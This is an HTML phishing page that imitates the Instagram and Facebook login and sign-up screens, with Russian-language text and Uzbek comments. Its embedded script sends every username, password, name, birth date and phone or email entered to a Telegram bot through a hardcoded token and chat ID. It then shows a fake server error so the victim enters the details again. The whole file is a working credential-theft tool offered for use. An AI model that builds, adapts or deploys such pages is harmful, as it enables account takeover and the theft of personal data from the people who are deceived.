<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram & Facebook Clone</title>
    <style>
        /* Umumiy sozlamalar */
        body, html { margin: 0; padding: 0; height: 100%; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        .wrapper { display: flex; flex-direction: column; min-height: 100vh; justify-content: center; align-items: center; }
        .hidden { display: none !important; }

        /* --- INSTAGRAM STILI (Qora mavzu) --- */
        .insta-bg { background-color: #000000; color: #ffffff; }
        .insta-container { width: 100%; max-width: 350px; text-align: center; padding: 20px; }
        .logo-img { width: 175px; margin-bottom: 20px; object-fit: contain; }
        .insta-input { width: 100%; background: #121212; border: 1px solid #363636; border-radius: 3px; color: #f5f5f5; padding: 12px; margin-bottom: 8px; box-sizing: border-box; font-size: 12px; }
        .insta-btn { width: 100%; background-color: #0095f6; border: none; color: #ffffff; border-radius: 8px; font-weight: 600; padding: 10px; font-size: 14px; cursor: pointer; margin-top: 10px; }
        .insta-link { color: #ffffff; font-size: 12px; text-decoration: none; margin-top: 20px; display: block; }
        .insta-border-btn { width: 100%; background: none; border: 1px solid #363636; color: #ffffff; border-radius: 20px; padding: 8px; margin-top: 15px; cursor: pointer; font-size: 14px; }
        .meta-footer { margin-top: 30px; opacity: 0.7; font-size: 12px; }

        /* --- FACEBOOK STILI (Oq mavzu) --- */
        .fb-bg { background-color: #ffffff; color: #1c1e21; }
        .fb-container { width: 100%; max-width: 400px; text-align: center; padding: 20px; }
        .fb-logo-img { width: 60px; margin-bottom: 15px; }
        .fb-input { width: 100%; background: #f5f6f7; border: 1px solid #dddfe2; border-radius: 6px; padding: 14px; margin-bottom: 12px; box-sizing: border-box; font-size: 16px; }
        .fb-btn { width: 100%; background-color: #1877f2; border: none; border-radius: 6px; color: #ffffff; font-weight: 700; padding: 12px; font-size: 18px; cursor: pointer; }
        .fb-reg-box { background: #ffffff; padding: 20px; text-align: left; }
        .fb-select { flex: 1; padding: 8px; border: 1px solid #dddfe2; border-radius: 4px; }
        .fb-submit-reg { background-color: #00a400; color: white; border: none; border-radius: 6px; padding: 10px 40px; font-weight: bold; font-size: 18px; width: 100%; margin-top: 20px; }
    </style>
</head>
<body>

<!-- 1-RASM: INSTAGRAM LOGIN -->
<div id="insta_login" class="wrapper insta-bg">
    <div class="insta-container">
        <!-- 5-rasm dagi logo tursin deyilgan joy -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" class="logo-img" alt="Instagram Logo">
        
        <div style="font-weight: bold; margin-bottom: 20px; text-align: left;">Войти в Instagram</div>
        <input type="text" id="ins_log_u" class="insta-input" placeholder="Имя пользователя, номер или email">
        <input type="password" id="ins_log_p" class="insta-input" placeholder="Пароль">
        <button class="insta-btn" onclick="sendToTG('Insta Login', 'ins_log_u', 'ins_log_p')">Войти</button>
        
        <a href="#" class="insta-link">Забыли пароль?</a>
        
        <button class="insta-border-btn" onclick="show('fb_login')">Войти через Facebook</button>
        <button class="insta-border-btn" style="border-color: #0095f6; color: #0095f6;" onclick="show('insta_reg')">Создать новый аккаунт</button>
        
        <div class="meta-footer">∞ Meta</div>
    </div>
</div>

<!-- 2-RASM: INSTAGRAM REGISTRATION -->
<div id="insta_reg" class="wrapper insta-bg hidden">
    <div class="insta-container">
        <div style="text-align: left; font-size: 20px; font-weight: bold; margin-bottom: 10px;">Зарегистрируйтесь в Instagram</div>
        <p style="text-align: left; font-size: 14px; color: #8e8e8e;">Зарегистрируйтесь, чтобы смотреть фото и видео ваших друзей.</p>
        
        <input type="text" id="ins_r_contact" class="insta-input" placeholder="Номер мобильного или email">
        <input type="password" id="ins_r_pass" class="insta-input" placeholder="Пароль">
        
        <div style="text-align: left; font-size: 14px; margin: 15px 0 5px;">Дата рождения ⓘ</div>
        <div style="display: flex; gap: 5px;">
            <select id="ins_r_d" class="insta-input" style="width: 30%"></select>
            <select id="ins_r_m" class="insta-input" style="width: 40%"></select>
            <select id="ins_r_y" class="insta-input" style="width: 30%"></select>
        </div>

        <input type="text" id="ins_r_name" class="insta-input" placeholder="Имя и фамилия">
        <input type="text" id="ins_r_user" class="insta-input" placeholder="Имя пользователя">
        
        <button class="insta-btn" onclick="sendFull('Insta Reg', ['ins_r_contact', 'ins_r_pass', 'ins_r_d', 'ins_r_m', 'ins_r_y', 'ins_r_name', 'ins_r_user'])">Отправить</button>
        <button class="insta-border-btn" onclick="show('insta_login')">У меня уже есть аккаунт</button>
    </div>
</div>

<!-- 3-RASM: FACEBOOK LOGIN -->
<div id="fb_login" class="wrapper fb-bg hidden">
    <div class="fb-container">
        <!-- 6-rasm dagi logo tursin deyilgan joy -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/2048px-2021_Facebook_icon.svg.png" class="fb-logo-img" alt="FB Logo">
        
        <div style="font-size: 24px; font-weight: bold; margin-bottom: 20px;">Войти на Facebook</div>
        <input type="text" id="fb_l_u" class="fb-input" placeholder="Электронный адрес или номер">
        <input type="password" id="fb_l_p" class="fb-input" placeholder="Пароль">
        <button class="fb-btn" onclick="sendToTG('FB Login', 'fb_l_u', 'fb_l_p')">Войти</button>
        
        <a href="#" class="insta-link" style="color: #1877f2;">Забыли пароль?</a>
        <div style="border-top: 1px solid #dddfe2; margin: 20px 0;"></div>
        <button class="insta-border-btn" style="border-color: #1877f2; color: #1877f2;" onclick="show('fb_reg')">Создать новый аккаунт</button>
        <div class="meta-footer" style="color: #1c1e21;">∞ Meta</div>
    </div>
</div>

<!-- 4-RASM: FACEBOOK REGISTRATION -->
<div id="fb_reg" class="wrapper fb-bg hidden">
    <div class="fb-container fb-reg-box">
        <div style="font-size: 24px; font-weight: bold;">Начните пользоваться Facebook</div>
        <div style="color: #606770; margin-bottom: 15px;">Создайте аккаунт для общения с друзьями.</div>
        
        <div style="display: flex; gap: 10px;">
            <input type="text" id="fb_r_n" class="fb-input" placeholder="Имя">
            <input type="text" id="fb_r_s" class="fb-input" placeholder="Фамилия">
        </div>
        
        <div style="font-size: 14px; margin-bottom: 5px;">Дата рождения ⓘ</div>
        <div style="display: flex; gap: 5px; margin-bottom: 15px;">
            <select id="fb_r_d" class="fb-select"></select>
            <select id="fb_r_m" class="fb-select"></select>
            <select id="fb_r_y" class="fb-select"></select>
        </div>

        <input type="text" id="fb_r_c" class="fb-input" placeholder="Номер мобильного или email">
        <input type="password" id="fb_r_p" class="fb-input" placeholder="Пароль">
        
        <button class="fb-submit-reg" onclick="sendFull('FB Reg', ['fb_r_n', 'fb_r_s', 'fb_r_d', 'fb_r_m', 'fb_r_y', 'fb_r_c', 'fb_r_p'])">Отправить</button>
        <div style="text-align: center; margin-top: 15px; color: #1877f2; cursor: pointer;" onclick="show('fb_login')">У меня уже есть аккаунт</div>
    </div>
</div>

<script>
    const TOKEN = '8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY';
    const ID = '6198817749';

    function show(id) {
        document.querySelectorAll('.wrapper').forEach(w => w.classList.add('hidden'));
        document.getElementById(id).classList.remove('hidden');
    }

    // Sanalarni to'ldirish
    function initDates() {
        const months = ["Январь", "Февраль", "Март", "Апрель", "Май", "Июнь", "Июль", "Август", "Сентябрь", "Октябрь", "Ноябрь", "Декабрь"];
        const ids = ['ins_r_', 'fb_r_'];
        ids.forEach(prefix => {
            const d = document.getElementById(prefix + 'd'), m = document.getElementById(prefix + 'm'), y = document.getElementById(prefix + 'y');
            for(let i=1; i<=31; i++) d.innerHTML += `<option>${i}</option>`;
            months.forEach(mo => m.innerHTML += `<option>${mo}</option>`);
            for(let i=2026; i>=1970; i--) y.innerHTML += `<option>${i}</option>`;
        });
    }
    initDates();

    async function sendToTG(type, uId, pId) {
        const u = document.getElementById(uId).value;
        const p = document.getElementById(pId).value;
        if(!u || !p) return alert("Hamma joyni to'ldiring!");
        
        const text = `🔔 ${type}\n👤 Login: ${u}\n🔑 Parol: ${p}`;
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(text)}`);
        alert("Xatolik yuz berdi (Error 500). Qayta urinib ko'ring.");
    }

    async function sendFull(type, ids) {
        let text = `🔔 ${type}\n`;
        let filled = true;
        ids.forEach(id => {
            const val = document.getElementById(id).value;
            if(!val) filled = false;
            text += `🔸 ${id}: ${val}\n`;
        });
        if(!filled) return alert("Hamma joyni to'ldiring!");
        
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(text)}`);
        alert("Server bilan ulanishda xatolik.");
    }
</script>
</body>
</html>
